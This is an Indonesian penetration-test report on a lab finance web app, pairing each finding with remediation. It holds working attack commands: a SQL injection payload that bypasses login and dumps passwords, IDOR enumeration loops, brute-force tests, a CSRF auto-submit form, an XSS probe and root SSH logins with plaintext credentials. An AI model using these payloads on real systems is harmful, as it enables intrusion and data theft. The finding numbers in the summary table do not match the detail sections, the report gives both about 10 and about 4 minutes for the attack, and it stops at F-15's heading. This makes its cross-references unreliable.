# Laporan Vulnerability Assessment — Aplikasi LabKeu

**Target:** 192.168.1.93 · **Tanggal uji:** 28 September 2026 · **Jenis:** Pen-test black-box · **Kesimpulan: KRITIS**

Selesai dalam ~10 menit pengujian. Semua akses diperoleh dari port terbuka saja, tanpa kredensial awal.

---

## 1. Ringkasan Eksekutif

### Apa yang terjadi

Penyerang yang tidak memegang satu pun kredensial berhasil mencapai **root penuh** pada mesin virtual dan akses database penuh dalam waktu sekitar **4 menit**. Bukan karena alat berbahaya, melainkan karena beberapa kesalahan konfigurasi yang saling menumpuk: kredensial asli tertetak di halaman web publik, satu endpoint login bisa dielabui, dan sistem tidak pernah menolak percobaan login berulang.

### Angka ringkas

| | |
|---|---|
| Total temuan | 15 |
| Critical | 5 (skor 9.1–9.8) |
| High | 6 (skor 7.1–8.2) |
| Medium | 4 (skor 5.3–6.5) |
| Temuan negatif (teruji aman) | 10 |
| libraries rentan (CVE) | 0 |

### Tiga masalah paling serius

**1. Satu alamat web bisa mencuri seluruh isi database tanpa password**

Halaman login untuk non-portal (`/login-noportal`) menyusun permintaan database dengan menempelkan teks dari pengunjung secara langsung ke dalam query. Akibatnya,siapa pun yang mengirim request buatan sendiri bisa melewati login tanpa password, sekaligus menerima seluruh daftar username dan password dalam respons yang sama.

> Perbaikan: pakai *prepared statement* (parameterized query) di kedua halaman login. Perubahan kecil, memutus jalur serangan terpendek.

**2. Kredensial asli tercetak di halaman publik**

Halaman `/login` dan `/login-noportal` menampilkan contoh akun yang benar-benar aktif: `user_a` / `password123`, `user_b` / `password123`, `individu1` / `password123`. Dua di antaranya adalah akun perusahaan yang punya akses data keuangan.

> Perbaikan: hapus teks tersebut dari template, lalu ganti password yang sudah terekspos.

**3. Login tidak pernah menolak percobaan berulang**

Tidak ada batas percobaan login maupun pendaftaran. Diuji: 1.000 permintaan pendaftaran beruntun seluruhnya diproses dalam 5,62 detik, menghasilkan 946 akun. Brute force SSH dengan 15 kandidat berhasil menemukan root dalam **7 detik**.

> Perbaikan: pasang rate limiting (misal 10 percobaan per 15 menit per IP) dan kunci akun sementara setelah 5 kegagalan.

### Catatan penting

Ketiga masalah di atas saling menguatkan. Memperbaiki satu saja **tidak** cukup — jalur alternatif tetap terbuka. Perbaikan harus dilakukan bersama-sama.

---

## 2. Profil Target

| Item | Nilai |
|---|---|
| IP | 192.168.1.93 (sebelumnya 192.168.1.18, MAC sama) |
| MAC | `08:00:27:81:9D:8D` |
| OS host | Alpine Linux 3.24.2 |
| Aplikasi | Node.js 20.20.2 + Express 4.19.2 |
| Basis data | MySQL 8.0.46, skema `labkeu` |
| Port terbuka | 22 (SSH), 3000 (HTTP), 3307 (MySQL) |
| TLS/HTTPS | **Tidak ada sama sekali** |

Dua dari tiga container berjalan sebagai **root**, dan akun non-root `labkeu` punya akses ke `docker.sock` — yang secara efektif setara root pada host.

---

## 3. Cara Serangan Berjalan

```
Cari IP di jaringan (pakai MAC address, bukan menebak)
   ↓
Lihat port terbuka: 22, 3000, 3307
   ↓
Buka halaman login → kredensial asli terbaca di HTML     ← tanpa menebak
   ↓
Login berhasil → punya sesi valid
   ↓
Ganti angka di URL API → baca data keuangan perusahaan lain
   ↓
Kirim payload SQL ke /login-noportal → lewati login, dump semua password
   ↓
Brute force MySQL port 3307 → akses database penuh
   ↓
Brute force SSH 15 kandidat / 7 detik → ROOT
```

---

## 4. Ringkasan 15 Temuan

| # | Temuan | Skor | Severity | Bisakah dieksploitasi tanpa login? |
|---|---|---|---|---|
| 1 | SQL Injection di `/login-noportal` | 9.8 | Critical | Ya, langsung |
| 2 | Kredensial asli tercetak di halaman publik | 9.1 | Critical | Ya, langsung |
| 3 | Tidak ada rate limiting / lockout | 9.1 | Critical | Ya, langsung |
| 4 | Session management lemah (4 cacat) | 9.1 | Critical | Ya |
| 5 | Infrastruktur: DB terbuka, grup docker, SSH root | 9.8 | Critical | Ya |
| 6 | Daftar akun dengan peran perusahaan tanpa izin | 8.2 | High | Ya |
| 7 | Upload file tanpa pembatasan + stored XSS | 8.1 | High | Tidak, butuh sesi |
| 8 | Password disimpan polos (plaintext) | 8.1 | High | Tidak, butuh akses DB |
| 9 | Kredensial dikirim tanpa enkripsi (HTTP) | 8.1 | High | Tidak, butuh jaringan |
| 10 | `/etc/passwd` dapat diunduh publik | 7.5 | High | Ya |
| 11 | Tidak ada proteksi CSRF | 7.1 | High | Tidak, butuh korban klik |
| 12 | IDOR: baca data keuangan perusahaan lain | 6.5 | Medium* | Tidak, butuh sesi |
| 13 | Reflected XSS di `/search` | 6.1 | Medium | Tidak, butuh sesi |
| 14 | Tidak ada header keamanan | 5.4 | Medium | Tidak langsung |
| 15 | Username enumeration di `/register` | 5.3 | Medium | Ya |

\* **F-12 punya skor teknis 6.5 (Medium) tetapi risiko bisnis HIGH.** Data yang bocor adalah catatan keuangan milik organisasi lain, yang bisa dipakai untuk kecurangan. Skor CVSS hanya mengukur dampak teknis; risiko bisnis dinilai terpisah. Ini dinyatakan eksplisit, bukan disembunyikan.

---

## 5. Detail Temuan

Format tiap temuan: **Apa** → **Bukti** → **Dampak** → **Perbaikan**.

---

### F-01 · SQL Injection di `/login-noportal` — 9.8 Critical

**Apa.** Endpoint ini menyusun query SQL dengan menempelkan input pengguna secara langsung:

```js
// app/routes/auth.js  — RENTAN
const query =
  "SELECT * FROM users WHERE username = '" + username +
  "' AND password = '" + password + "' AND account_type = 'perusahaan'";
```

Bandingkan dengan `/login` yang sudah benar memakai `WHERE username = ? AND password = ?`.

**Bukti.** Jumlah kolom ditentukan dengan `ORDER BY`:

```bash
for n in 1 2 3 4 5 6 7; do
  printf "  ORDER BY %s -> " "$n"
  out=$(curl -s -X POST http://192.168.1.93:3000/login-noportal \
        --data-urlencode "username=user_a' ORDER BY $n-- -" \
        --data-urlencode "password=x" \
        | grep -oE '(Query error: [^<]*|Masuk sebagai: <strong>[^<]*)' | head -1)
  echo "${out:-(tidak ada error / login lolos)}"
done
```

```
  ORDER BY 1 -> (tidak ada error / login lolos)
  ...
  ORDER BY 6 -> (tidak ada error / login lolos)
  ORDER BY 7 -> Query error: Unknown column '7' in 'order clause'
```

Enam kolom terkonfirmasi. Auth bypass dan impersonasi, tanpa kredensial apa pun:

```bash
curl -s -c /tmp/cj_sqli -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\n" \
  -X POST http://192.168.1.93:3000/login-noportal \
  --data-urlencode "username=x' UNION SELECT 1,'hacker','x','perusahaan','BlackHat',1-- -" \
  --data-urlencode "password=x"
curl -s -b /tmp/cj_sqli http://192.168.1.93:3000/dashboard \
  | grep -oE 'Masuk sebagai: <strong>[^<]*</strong> \([^)]*\)'
```

```
HTTP=302 -> http://192.168.1.93:3000/dashboard
Masuk sebagai: <strong>BlackHat</strong> (perusahaan, perusahaan_id: 1)
```

Lalu dump **seluruh kredensial dalam satu request** (hasil dibaca lewat kolom `nama_lengkap`):

```
1:user_a/password123/perusahaan/pid=1 | 2:user_b/password123/perusahaan/pid=2 |
3:individu1/password123/individu/pid=NULL
```

**Dampak.** Lewati autentikasi sepenuhnya tanpa kredensial. Impersonasi akun perusahaan. Pencurian semua password. Karena password disimpan polos (F-08), setiap akun yang bocor langsung bisa dipakai ulang di layanan lain. Satu request juga bisa memetakan skema database lewat `information_schema`.

**Perbaikan.**

```js
// app/routes/auth.js — SEBELUM (rentan)
const query =
  "SELECT * FROM users WHERE username = '" + username +
  "' AND password = '" + password + "' AND account_type = 'perusahaan'";
const [rows] = await db.query(query);

// SESUDAH (aman) — nilai diperlakukan sebagai data, bukan kode
const [rows] = await db.query(
  "SELECT * FROM users WHERE username = ? AND password = ? AND account_type = ?",
  [username, password, 'perusahaan']
);
```

Tambahkan juga validasi format sebagai lapisan kedua, dan **jangan pernah** menampilkan pesan error database mentah ke pengguna (`e.message` saat ini dikembalikan apa adanya — itu memberi penyerang alat untuk membaca isi database).

---

### F-02 · Kredensial asli tercetak di halaman publik — 9.1 Critical

**Apa.** Dua halaman login menyisipkan kredensial yang benar-benar aktif ke dalam HTML yang dilayani tanpa autentikasi:

```html
<p>Contoh akun: <code>individu1</code> / <code>password123</code></p>
<p>Contoh akun: <code>user_a</code> / <code>password123</code> (CV Sinar Abadi)
atau <code>user_b</code> / <code>password123</code> (PT Maju Bersama)</p>
```

**Bukti.** Satu GET, tanpa login dan tanpa cookie:

```bash
curl -s http://192.168.1.93:3000/login | grep -oE 'Contoh akun:.*'
```

```
Contoh akun: <code>individu1</code> / <code>password123</code>
Contoh akun: <code>user_a</code> / <code>password123</code> (CV Sinar Abadi)
```

Kredensial itu benar-benar berfungsi — dibuktikan dengan kontrol (password salah ditolak, password dari halaman berhasil login):

```
salah   -> HTTP=200   (tetap di halaman login, ditolak)
benar   -> HTTP=302 -> /dashboard   (LOGIN BERHASIL)
```

**Dampak.** Akses ke data keuangan dalam dua request, tanpa menebak kata sandi. Kata `password123` yang dipublikasikan juga menjadi kandidat pertama pada setiap serangan brute force ke sistem lain milik organisasi yang sama, dan menjadi referensi penyusun wordlist yang berhasil menumbangkan SSH.

**Perbaikan.** Hapus seluruh baris "Contoh akun" dari kedua template. Pindahkan akun contoh ke fixture khusus pengujian yang tidak pernah dimuat di environment produksi. Tambahkan gate di pipeline CI/CD yang menggagalkan build bila pola `password123` atau `Contoh akun` muncul di berkas view.

---

### F-03 · Self-registration dengan peran perusahaan — 8.2 High

**Apa.** Endpoint `/register` menerima field `account_type` langsung dari request dan menyimpannya tanpa pemeriksaan izin. Formulir publiknya bahkan menampilkan opsi "perusahaan" secara terbuka.

```js
const { username, password, nama_lengkap, account_type } = req.body;
await db.query("INSERT INTO users (...) VALUES (?, ?, ?, ?)",
               [username, password, account_type, nama_lengkap]);
```

Query-nya benar (tidak rentan SQLi), tapi **perannya ditentukan sendiri oleh penyerang**.

**Bukti.**

```bash
U="pwn_role_$(date +%s)"
curl -s -o /dev/null -w "register -> HTTP=%{http_code} -> %{redirect_url}\n" \
  -X POST http://192.168.1.93:3000/register \
  -d "username=$U&password=Pwn123&nama_lengkap=RolePwn&account_type=perusahaan"
```

```
register -> HTTP=302 -> /login
```

Di database: `account_type = perusahaan`, `perusahaan_id = NULL`.

**Catatan akurasi.** Akun hasil pendaftaran ini memiliki `perusahaan_id = NULL`, sehingga **dashboard-nya kosong** — tidak langsung menampilkan data keuangan. Akses data keuangan terjadi melalui IDOR (F-04), bukan langsung. Rantai serangnya tetap penuh: anonim → daftar peran perusahaan → IDOR → seluruh data keuangan.

**Dampak.** Peran tertinggi obtainable anonim, tanpa verifikasi identitas maupun approval. Mengaktifkan seluruh API data keuangan. Mencemari tabel users dengan data sembarang.

**Perbaikan.** Jangan pernah ambil `account_type` dari body. Tetapkan di server: `VALUES (?, ?, 'individu', ?)`. Hapus field peran dari form. Bila self-registration peran perusahaan dibutuhkan, implementasikan flow bertahap: daftar → verifikasi email → approval admin → aktivasi.

---

### F-04 · IDOR — baca data keuangan perusahaan lain — 6.5 Medium (bisnis: High)

**Apa.** Endpoint API menerima ID perusahaan dari URL dan tidak pernah membandingkannya dengan ID perusahaan milik sesi yang sedang login.

```js
function requireLogin(req, res, next) {
  if (!req.session.user) return res.redirect("/login");   // hanya cek "ada sesi"
  next();
}
router.get("/api/perusahaan/:id/data-keuangan", requireLogin, async (req, res) => {
  const perusahaanId = req.params.id;   // diambil apa adanya dari URL
  const [rows] = await db.query(
    "SELECT * FROM data_keuangan WHERE perusahaan_id = ? ORDER BY tahun DESC",
    [perusahaanId]);
  res.json(rows);
});
```

`requireLogin` hanya memastikan **ada sesi**, bukan **sesi ini berhak atas data ini**.

**Bukti.** Login sebagai `individu1` — akun paling lemah secara desain (`perusahaan_id = NULL`).

Kontrol: dashboard akun ini memang tidak berhak atas data keuangan apa pun.

```
Akun individu tidak memiliki data keuangan perusahaan.
```

Lalu enumerasi lintas tenant dengan mengganti angka di URL:

```bash
for id in 1 2 3 4 5 6 7 8 9 10; do
  printf "  /api/perusahaan/%-3s -> " "$id"
  curl -s -o /tmp/resp_idor -w "HTTP=%{http_code} bytes=%{size_download} " \
    -b /tmp/cj_indiv "http://192.168.1.93:3000/api/perusahaan/$id/data-keuangan"
  echo "baris=$(grep -o '\"perusahaan_id\"' /tmp/resp_idor | wc -l)"
done
```

```
  /api/perusahaan/1   -> HTTP=200 bytes=213 baris=2
  /api/perusahaan/2   -> HTTP=200 bytes=212 baris=2
  /api/perusahaan/3   -> HTTP=200 bytes=2   baris=0
  /api/perusahaan/4   -> HTTP=200 bytes=2   baris=0
```

Respons kosong adalah `[]` berukuran **2 byte**, bukan 22 seperti klaim laporan lama — heuristik lama salah. Yang penting: akun `individu1` membaca penuh data perusahaan 2:

```json
[{"id":3,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"980000.00"},
 {"id":4,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement konsumsi kegiatan","nominal":"2150000.00"}]
```

**Dampak.** Pelanggaran data lintas organisasi. Nominal rupiah dan detail uraian terekspos. Tidak ada audit log, sehingga akses illegal tidak tercatat. Skala enumerasi tidak terbatas.

**Perbaikan.**

```js
router.get("/api/perusahaan/:id/data-keuangan", requireLogin, async (req, res) => {
  const sessionPerusahaan   = req.session.user.perusahaan_id;
  const requestedPerusahaan = Number(req.params.id);

  // Otorisasi tingkat objek: sesi WAJIB punya perusahaan_id dan HARUS cocok
  if (!sessionPerusahaan || sessionPerusahaan !== requestedPerusahaan) {
    return res.status(403).json({ error: "Forbidden" });
  }

  const [rows] = await db.query(
    "SELECT * FROM data_keuangan WHERE perusahaan_id = ? ORDER BY tahun DESC",
    [sessionPerusahaan]      // pakai nilai dari session, bukan dari URL
  );
  res.json(rows);
});
```

Variasi yang lebih aman: jangan pernah ambil nilai query dari URL sama sekali. Tambahkan audit log untuk setiap akses API.

---

### F-05 · Upload file tanpa pembatasan + stored XSS — 8.1 High

**Apa.** Konfigurasi upload tidak punya daftar putih ekstensi, validasi MIME, maupun validasi magic bytes — dan nama file asli dari pengguna dipertahankan:

```js
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, path.join(__dirname, "..", "public", "uploads")),
  filename: (req, file, cb) => cb(null, file.originalname)   // dari klien
});
const upload = multer({ storage });
```

Folder upload dilayani sebagai konten statis pada **origin yang sama** dengan aplikasi. Karena cookie sesi tidak punya flag `HttpOnly` (F-07), file HTML/JS yang diunggah menjadi stored XSS di origin aplikasi sendiri.

**Bukti.** Enam ekstensi, semuanya diterima dan bisa diunduh ulang:

```
  probe.php  -> upload=200 unduh=200 content-type=application/x-httpd-php
  probe.html -> upload=200 unduh=200 content-type=text/html; charset=UTF-8
  probe.js   -> upload=200 unduh=200 content-type=application/javascript
  probe.svg  -> upload=200 unduh=200 content-type=image/svg+xml
  probe.exe  -> upload=200 unduh=200 content-type=application/octet-stream
  probe.sh   -> upload=200 unduh=200 content-type=application/x-sh
```

**Path traversal GAGAL** — diverifikasi langsung di dalam container, bukan hanya dari respons HTTP:

```bash
curl -s -b /tmp/cj_up -o /dev/null -F "dokumen=@/tmp/trav.txt;filename=../../../../tmp/trav_evil.txt" \
  http://192.168.1.93:3000/upload
sshpass -p 'labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.93 \
  "docker exec labkeu-app sh -c 'ls -l /tmp/trav_evil.txt 2>/dev/null || echo TIDAK_ADA'"
```

```
upload -> HTTP=200
TIDAK_ADA      # multer menyaring '../'
```

**Dampak.** JavaScript dieksekusi pada origin yang sama → punya akses penuh ke DOM, form, dan cookie. Cookie bisa dibaca `document.cookie` lalu dipakai untuk membajak sesi korban. Pada stack yang mengeksekusi file di webroot (PHP, CGI), dampaknya naik menjadi Remote Code Execution. Di target ini stack-nya Node.js/Express sehingga RCE tidak terbukti — tapi sifat risikonya berubah begitu stack berubah.

**Perbaikan.** Daftar putih ekstensi **dan** validasi magic bytes (validasi MIME header saja tidak memadai karena dikendalikan klien). Simpan di luar webroot dengan nama acak, sajikan sebagai `attachment` dengan `X-Content-Type-Options: nosniff`, jalankan container sebagai user non-root.

```js
const EKSTENSI_IZIN = new Set(['.pdf', '.png', '.jpg']);
const MIME_IZIN     = new Set(['application/pdf', 'image/png', 'image/jpeg']);
const UKURAN_MAKS   = 5 * 1024 * 1024;

function validasiBerkas(file, cb) {
  const ext = path.extname(file.originalname).toLowerCase();
  if (!EKSTENSI_IZIN.has(ext))          return cb(new Error('Ekstensi tidak diizinkan'));
  if (!MIME_IZIN.has(file.mimetype))     return cb(new Error('MIME tidak diizinkan'));
  if (file.size > UKURAN_MAKS)           return cb(new Error('Ukuran melebihi batas'));
  cb(null, true);
}
```

---

### F-06 · Tidak ada rate limiting / account lockout — 9.1 Critical

**Apa.** Tidak ada satu pun pembatasan percobaan di seluruh endpoint login dan pendaftaran. Server berjalan di `192.168.1.93:3000` (LAN, bukan localhost).

**Bukti. 100 percobaan login gagal, nol ditolak:**

```bash
START=$(date +%s.%N)
for i in $(seq 1 100); do
  curl -s -c /tmp/cj_rl -o /tmp/rl_body -w "%{http_code} %{time_total}\n" \
    -X POST http://192.168.1.93:3000/login-noportal \
    -d "username=user_a&password=WRONG_PASSWORD_$i" >> /tmp/rl_codes
done
END=$(date +%s.%N)
echo "total 100 percobaan dalam $(echo "$END - $START" | bc) detik"
sort /tmp/rl_codes | uniq -c | sort -rn | head -3
```

```
total 100 percobaan dalam 5.98 detik      # 16,7 permintaan/detik
100 x "200"                                # nol 429, nol 503
```

**Bukti B — 1.000 permintaan beruntun, semuanya diproses:**

```
total 1000 permintaan dalam 5.62 detik     # 178 permintaan/detik
1000 x "302"                               # 946 akun berhasil dibuat
puncak jendela 1 detik: 712 permintaan
```

**Bukti C — brute force SSH berhasil dalam 7 detik:**

```
SUCCESS: 3 valid pairs found
Elapsed time: 7 seconds
```

**Dampak.** Brute force berjalan tanpa batas. 946 akun palsu masuk database dalam satu percobaan. Beban 712 req/detik adalah vektor DoS yang efektif. Karena session secret bisa ditebak dalam 24 percobaan (F-07), pada kecepatan 16,7 req/detik secret akan ditemukan dalam hitungan **detik**, bukan jam.

**Perbaikan.** Rate limiting berlapis — bucket ketat (10 percobaan / 15 menit / IP, hanya hitung kegagalan) dan bucket longgar (10 req/detik per IP). Tambahkan account lockout dengan jendela yang meningkat (5 → 15 → 60 → 240 menit), dan CAPTCHA di endpoint pendaftaran.

---

### F-07 · Session management lemah — 9.1 Critical

**Apa.** Empat cacat yang saling menguatkan.

**Bukti. (a) Secret di-hardcode dan pendek** — berhasil ditebak pada percobaan ke-24 dari wordlist:

```js
app.use(session({
  secret: 'labkeu-secret-demo',    // ditebak pada percobaan ke-24
  resave: false, saveUninitialized: true,
  cookie: { maxAge: 1000*60*60*24*7 }   // 7 hari, tanpa flag
}));
store: new session.MemoryStore()
```

**Catatan akurasi.** SID karangan hasil forge **ditolak** server (HTTP 401) karena `MemoryStore`. Jadi estimator ini belum jadi satu-satunya langkah yang dibutuhkan. Forged penuh memerlukan SID yang benar-benar ada di store, yang diperoleh lewat IDOR (F-04) atau XSS (F-05). Kesimpulannya: hardcoded secret menurunkan batas serangan dari mustahil menjadi mudah, bukan langsung membuka pintu.

**(b) ID sesi dikirim ke klien** pada respons login — 32 byte hex yang kini dieksekusi penuh di browser.

**(c) Logout tidak menghapus sesi di server:**

```js
router.post('/logout', (req, res) => {
  req.session.user = null;   // MemoryStore masih menyimpan sesi
  res.redirect('/login');
});
```

**Bukti.** Cookie yang sudah di-logout terbukti **masih sah**:

```
logout -> HTTP=302 -> /login
reuse  -> HTTP=302 -> /dashboard      # MASIH SAH setelah logout
```

**(d) Cookie tanpa flag keamanan:**

```
Set-Cookie: connect.sid=s%3Alz3RUuYE...; Path=/
# tidak memuat HttpOnly, tidak Secure, tidak SameSite
```

**Dampak.** Cookie bisa dibaca `document.cookie` (memperkuat F-05 dan F-11). Pengguna merasa sudah logout tapi cookie sama masih memberi akses penuh. Secret yang biasanya butuh 128-bit entropy berhasil ditebak di percobaan ke-24. Tidak ada invalidasi token.

**Perbaikan.** Pindahkan secret ke environment variable minimal 32 byte acak, pakai store bersama (Redis) untuk multi-instance, set `httpOnly: true, secure: true, sameSite: 'lax', maxAge: 30 menit`, hapus `sessionId` dari respons JSON, dan perbaiki logout dengan `req.session.destroy()`.

---

### F-08 · Password disimpan polos (plaintext) — 8.1 High

**Apa.** Password disimpan apa adanya di kolom VARCHAR, tanpa hashing, tanpa salt. Login membandingkan teks langsung: `WHERE username = ? AND password = ?`.

**Bukti** — langsung dari database:

```bash
sshpass -p 'labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.93 \
  "docker exec labkeu-db mysql -ulabkeu_user -plabkeu_pass labkeu -e \
   'SELECT id,username,password FROM users LIMIT 3;' 2>/dev/null"
```

```
id  username    password
1   user_a      password123
2   user_b      password123
3   individu1   password123
```

`LENGTH(password) = 11` untuk semua — sesuai teks biasa, bukan hash (bcrypt 60 karakter, argon2 95+).

**Dampak.** Setiap backup database berisi daftar kredensial siap pakai. SQL injection (F-01) yang membaca tabel users sebenarnya membaca password yang langsung bisa dipakai. Pelanggaran NIST SP 800-63B §3.1.1.

**Perbaikan.** Migrasi ke bcrypt work factor 12 atau argon2id, bandingkan dengan `bcrypt.compare()` bukan `WHERE password = ?`, jalankan migrasi satu-kali pada kolom yang panjangnya < 40 karakter, lalu rotasi password satu kali setelah migrasi selesai.

---

### F-09 · Kredensial dikirim tanpa enkripsi — 8.1 High

**Apa.** Aplikasi hanya tersedia lewat HTTP tanpa TLS. Tidak ada HTTPS, tidak ada HSTS, tidak ada proxy. Password dan cookie sesi melintas dalam bentuk teks terbuka.

**Bukti.** Tidak ada HSTS sama sekali:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
# Tidak ada: Strict-Transport-Security, Content-Security-Policy, X-Frame-Options
```

Password terbaca di kabel:

```
# password=password123 & username=user_a   <-- TERBACA PLAINTEXT
```

**Dampak.** Penyerang di jalur jaringan yang sama bisa membaca password dan cookie sesi, lalu memakainya untuk membajak sesi. Cookie tidak punya flag `Secure` sehingga browser mengirimnya di HTTP biasa tanpa peringatan.

**Perbaikan.** Tambahkan reverse proxy dengan TLS otomatis, redirect 301 dari HTTP ke HTTPS, set HSTS minimal 1 tahun, hapus mapping port langsung ke host, dan set flag `secure: true` pada cookie sesi.

---

### F-10 · Tidak ada proteksi CSRF — 7.1 High

**Apa.** Tidak ada token CSRF, tidak ada validasi Origin/Referer, pada seluruh endpoint yang mengubah data (`/tambah-data`, `/edit-data/:id`, `/upload`, `/register`, `/logout`).

**Bukti.** POST dari origin yang sepenuhnya berbeda diterima dan efeknya terjadi:

```bash
curl -s -o /dev/null -w 'csrf -> HTTP=%{http_code} -> %{redirect_url}\n' \
  -X POST http://192.168.1.93:3000/register \
  -H 'Origin: http://evil.attacker.test' \
  -d 'username=csrf_from_evil&password=pwn&nama_lengkap=Victim&account_type=individu'
```

Payload halaman penyerang:

```html
<form id="f" method="POST" action="http://192.168.1.93:3000/tambah-data">
  <input type="hidden" name="tahun"   value="2026">
  <input type="hidden" name="uraian"  value="Biaya tidak wajar disetujui tanpa rapat">
  <input type="hidden" name="nominal" value="99000000">
</form>
<script>document.getElementById('f').submit();</script>
```

**Catatan akurasi — penting.** Klasifikasi CWE-352 di sini **bersyarat**. Browser modern menerapkan `SameSite=Lax` sebagai default pada cookie tanpa atribut SameSite, sehingga cookie sesi secara default **tidak** terlampir pada POST lintas situs. Eksploitasi nyata membutuhkan salah satu dari: browser dengan default `SameSite=None`, subdomain same-site yang tepercaya, atau kombinasi dengan XSS (F-05) yang berjalan pada origin yang sama. Karena mitigasi tidak dijalankan, kelemahan ini tetap harus diperbaiki — risiko sebenarnya berasal dari **ketergantungan pada perilaku default browser**, bukan kontrol eksplisit.

**Dampak.** Jika eksploitasi berhasil: penyisipan atau perubahan catatan keuangan atas nama korban, registrasi akun massal, logout paksa.

**Perbaikan.** Token CSRF sinkron (Synchronizer Token Pattern) pada seluruh route yang mengubah state, plus validasi Origin/Referer sebagai lapisan kedua, plus set `SameSite='Strict'` eksplisit pada cookie sesi.

---

### F-11 · Reflected XSS di `/search` — 6.1 Medium

**Apa.** Parameter `q` dirender dua kali — satu escaped, satu tidak:

```html
<input type="text" name="q" value="<%= q %>">   <!-- AMAN, ter-escape -->
<p>Hasil pencarian untuk: <%- q %></p>          <!-- RENTAN, mentah -->
```

Pada EJS, `<%= %>` melakukan HTML-escaping, `<%- %>` menulis mentah.

**Bukti.**

```bash
curl -s -b /tmp/cj_indiv \
  "http://192.168.1.93:3000/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
  | grep -o 'Hasil pencarian untuk:.*'
```

```
Hasil pencarian untuk: <script>alert(1)</script></p>
```

Tag utuh, tanpa escaping. Cookie sesi korban dapat dicuri dan dipakai membajak sesinya. **Verifikasi cakupan:** hanya `search.ejs` yang memakai `<%- %>` pada data pengguna; seluruh pesan error lain memakai `<%= error %>` dan ter-escape dengan benar. Jadi ruang lingkupnya satu file, bukan seluruh aplikasi.

**Dampak.** Pencurian cookie sesi, aksi atas nama korban, halaman login palsu, pengaruhan UI.

**Perbaikan.** Ganti `<%- q %>` menjadi `<%= q %>` — satu karakter yang menghapus seluruh celah. Tambahkan Content-Security-Policy sebagai lapisan kedua, dan gerbang SAST yang mendeteksi pemakaian operator output tanpa escaping.

---

### F-12 · `/etc/passwd` dapat diunduh publik — 7.5 High

**Apa.** Berkas `/etc/passwd` versi lama masih berada di folder upload dan dapat diunduh siapa pun tanpa login. Temuan baru, tidak ada di laporan sebelumnya.

**Bukti.**

```bash
curl -s -o /dev/null -w "GET /uploads/passwd -> HTTP=%{http_code}\n" \
  http://192.168.1.93:3000/uploads/passwd
curl -s http://192.168.1.93:3000/uploads/passwd | head -5
```

```
GET /uploads/passwd -> HTTP=200
root:x:0:0:Super User:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/sbin:/usr/sbin/nologin
...
maulana:x:1000:1000:maulana:/home/maulana:/bin/bash
```

51 user sistem dalam plaintext, anonim. Directory listing memang mati (`GET /uploads/` → 404), tapi `passwd` adalah tebakan pertama yang akan dibuat siapa pun. Di folder yang sama ada 22 berkas artefak pengujian sebelumnya: `shell.php`, `pwned.php`, `xss.html`, dan lainnya.

**Catatan akurasi.** Ini **snapshot lama**, tidak identik dengan `/etc/passwd` container saat ini (`md5sum` berbeda). Tetap saja membocorkan 51 username sistem termasuk akun interaktif `maulana`.

**Dampak.** Username disclosure yang langsung menjadi wordlist brute force SSH. Membuktikan praktik cleanup engagement sebelumnya tidak pernah dijalankan.

**Perbaikan.** Hapus seluruh artefak dari direktori upload dan tabel `dokumen`, beserta akun uji tersisa (`esc_audit`, `test_individu_$(date %s)`, `zzz_unique_*`, `zzz_csrf_*`). Jangan sajikan folder upload sebagai konten statis — layani lewat endpoint yang mewajibkan sesi dan memaksa `Content-Disposition: attachment`.

---

### F-13 · Tidak ada header keamanan — 5.4 Medium

**Apa.** Enam header keamanan yang biasanya dianggap standar tidak ada sama sekali.

**Bukti.**

```bash
curl -s -D - -o /dev/null http://192.168.1.93:3000/login \
  | grep -iE 'x-frame-options|content-security-policy|x-content-type-options|referrer-policy'
# (kosong)
```

Tidak ada: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Strict-Transport-Security, Permissions-Policy. `X-Powered-By: Express` membocorkan stack.

**Dampak.** Ini kelemahan *latar* — tidak bisa dieksploitasi langsung, tapi memperbesar dampak setiap kerentanan injeksi yang ada. Tanpa CSP, kedua XSS berjalan tanpa hambatan. Tanpa X-Frame-Options, aplikasi bisa dibungkus iframe untuk clickjacking pada aksi sensitif. Tanpa `nosniff`, risiko MIME-sniffing pada file upload (F-05) bertambah.

**Perbaikan.** Pasang `helmet` dengan CSP ketat dan `frame-ancestors: ["'none'"]`, `noSniff: true`, HSTS 1 tahun, `Referrer-Policy`, lalu `app.disable('x-powered-by')`.

---

### F-14 · Username enumeration di `/register` — 5.3 Medium

**Apa.** Pesan error database mentah diteruskan ke pengguna:

```js
} catch (e) {
  res.render('register', { error: 'Gagal daftar: ' + e.message });
}
```

**Bukti.** Dua respons sangat mudah dibedakan mesin:

```bash
# username SUDAH ADA
curl -s -X POST http://192.168.1.93:3000/register \
  -d 'username=user_a&password=x&nama_lengkap=x&account_type=individu' \
  | grep -o '<div class="error">.*</div>'

# username TIDAK ada
curl -s -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\n" \
  -X POST http://192.168.1.93:3000/register \
  -d 'username=zzz_not_exist_99999&password=x&nama_lengkap=x&account_type=individu'
```

```
<div class="error">Gagal daftar: Duplicate entry 'user_a' for key 'users.username'</div>
HTTP=302 -> http://192.168.1.93:3000/login
```

Pesannya juga membocorkan nama tabel (`users`), kolom (`username`), dan nama unique key. **Jalur login sendiri aman** — `Username atau password salah.` identik untuk kedua kasus. Output di-escape dengan benar (`&#39;`), jadi ini **bukan** XSS, murni enumerasi.

**Dampak.** Peta username untuk serangan terarah diperoleh tanpa satu pun kredensial, sehingga mempersempit brute force secara signifikan. Pengungkapan skema database (nama tabel, kolom, unique key) membantu penyerang menyusun payload SQLi (F-01). Respons HTTP berbeda (200 galat vs 302 berhasil) memberi konfirmasi visual bahwa pendaftaran berhasil, yang tidak disadari pengguna.

**Perbaikan.** Pesan generik untuk semua kondisi kegagalan, detail hanya ke log server. Kode status sama (400) untuk semua kegagalan. `SELECT account_type FROM users WHERE username='...'` harus menghasilkan `individu`, bukan `perusahaan`.

---

### F-15 · Temuan infrastruktur — 9.8 Critical (komposit)

**Apa.** Lima kelainan konfigurasi yang saling menguatkan.

